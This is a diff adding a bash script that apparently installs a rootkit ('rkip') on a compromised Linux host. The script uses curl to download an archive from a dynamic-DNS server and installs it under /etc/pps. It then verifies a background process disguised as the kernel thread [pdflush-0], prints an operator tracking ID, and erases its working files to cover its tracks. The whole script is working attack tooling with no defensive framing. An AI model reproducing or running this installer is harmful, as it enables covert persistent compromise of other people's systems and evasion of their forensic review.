@@ -1,0 +1,46 @@
+#!/bin/bash
+############## rkip install (p3)
+
+# echo -e "\033[0;31m [-] \033[0m\033[0m" # red
+# echo -e "\033[0;32m [+] \033[0m\033[0m" # green
+# echo -e "\033[0;36m xxx \033[0m\033[0m" #cyan
+
+
+os=`cat 1tempfiles/os.txt`
+rk=`cat 1tempfiles/rk.txt`
+side_files_dir=`cat 1tempfiles/side_files_dir.txt`
+maindir=`pwd`
+
+
+
+
+echo -e "\033[0;32m [+] \033[0m\033[0m downloading rkip" # green
+rm -rf side_files.tgz
+curl --progress-bar -O http://gopremium.mooo.com/.../auto/side_files.tgz
+if [ ! -f side_files.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+
+echo -e "\033[0;32m [+] \033[0m\033[0m starting rkip install" # green
+if [ -z $side_files_dir ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m no side_files_dir. aborting" ; echo ; exit ; fi
+rm -rf /etc/pps/side_files
+tar mzxf side_files.tgz ; rm -rf side_files.tgz ; cp -R side_files /etc/pps
+rkipdir="/etc/pps/side_files"
+cd $rkipdir ; yes y | ./install $side_files_dir 1>>$maindir/1tempfiles/log.rkip 2>>$maindir/1tempfiles/log.rkip
+node_process_id=$(pidof [pdflush-0])
+if [[ -z $node_process_id ]]; then
+        #echo " nu exista"
+        echo -e "\033[0;31m [-] \033[0m\033[0m background proccess did not start. aborting. check ($maindir/1tempfiles/log.rkip). script in /etc/pps/side_files"
+        echo ; exit
+fi
+echo -e "\033[0;32m [+] \033[0m\033[0m rkip install done (logs in $maindir/1tempfiles/log.rkip)"
+
+echo -e "\033[0;36m [x] \033[0m\033[0m write this down in your notepad :)" #cyan
+echo
+id_unic=`cat $maindir/1tempfiles/log.rkip|grep NOTEPAD`
+echo "$id_unic"
+echo
+
+
+#### cleaning shit out
+cd /etc/pps ; rm -rf side_files ; ./dep-safe.arhivez
+rm -rf $maindir
+
